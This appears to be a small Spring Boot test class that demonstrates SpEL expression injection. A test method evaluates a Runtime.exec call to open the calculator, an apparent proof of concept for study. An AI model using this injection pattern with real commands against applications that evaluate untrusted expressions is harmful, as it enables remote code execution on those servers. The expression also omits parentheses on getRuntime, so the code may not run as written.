package com.spelrce.demo;

import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

@SpringBootTest
class DemoApplicationTests {

    @Test
    void contextLoads() {

    }
    @Test
    void test1(){
        SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
        String exp="T(java.lang.Runtime).getRuntime.exec(\"calc\")";
        Expression expression = spelExpressionParser.parseExpression(exp);
        expression.getValue();

    }

}
